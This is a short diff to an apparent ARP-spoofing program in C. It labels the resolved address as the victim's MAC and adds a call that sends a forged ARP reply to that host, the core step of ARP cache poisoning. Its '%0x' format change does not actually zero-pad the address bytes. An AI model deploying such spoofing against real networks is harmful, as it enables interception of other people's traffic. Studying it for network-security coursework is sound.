@@ -91,11 +91,14 @@ int main(int argc, char * argv[])
 
 	}
 	char victim_mac_buf[18] = {0, };
-	sprintf(victim_mac_buf, "%x:%x:%x:%x:%x:%x", arp_packet->arp_sha[0]
+	sprintf(victim_mac_buf, "%0x:%0x:%0x:%0x:%0x:%0x", arp_packet->arp_sha[0]
 		, arp_packet->arp_sha[1], arp_packet->arp_sha[2], arp_packet->arp_sha[3]
 		, arp_packet->arp_sha[4], arp_packet->arp_sha[5]);
 
-	fprintf(stdout, "[*] target MAC addr\t: %s\n", victim_mac_buf);
+	fprintf(stdout, "[*] victim MAC addr\t: %s\n", victim_mac_buf);
+
+	sendArpPacket(handle, local_mac_strbuf, victim_mac_buf, argv[3], argv[2], ARPOP_REPLY);
+
 
 	return 0;
 }
